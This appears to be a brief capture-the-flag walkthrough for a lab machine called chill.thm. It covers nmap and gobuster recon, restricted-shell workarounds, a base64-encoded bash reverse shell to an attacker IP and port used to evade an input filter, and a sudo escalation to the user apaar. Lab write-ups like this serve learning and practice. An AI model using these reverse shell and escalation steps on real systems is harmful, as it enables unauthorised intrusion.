starting with a nmap 
```
nmap -p- -A chill.thm
```
<img width="716" height="817" alt="image" src="https://github.com/user-attachments/assets/0604c56c-b89f-4354-a324-7bf8eea3f4bc" />


then a gobuster 
```
gobuster dir -u http://chill.thm -w /usr/share/wordlists/dirb/big.txt -x php 
```
<img width="716" height="542" alt="image" src="https://github.com/user-attachments/assets/86f0e018-cbbd-4cdf-97e4-e66e8ec5bd09" />


every command in this broken shell 
```
to read permission : stat 
```

```
to read a file : tac
```

```
to list a repo : echo *
```

For get a reverse shell, we need to put someting with encoding in base 64.
We have use this command for get the encoding reverse shell
`echo -n "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64`

and we have put the base64 get with decoding in the input
`echo <urBase64> | base64 -d | b\ash `

GG, ur are in the shell but you don't have any permission. 
For get something permission and can get the first flag. 

We have put this command, to find out who files can lunch in root or something else
`sudo -l`
<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/71dee07b-eca5-417d-93ff-22572b86123e" />

We can see a script can he started with apaar and he have all premission. 
So we gonna use him for execute command as Apaar

`sudo -u apaar /home/apaar/.helpline.sh`
in the first input we can put anything.
So in the second input put this :
`/bin/bash`

and GG we are as Apaar now !!
<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/7c019368-0bee-4756-b4fa-800c5c71d49d" />


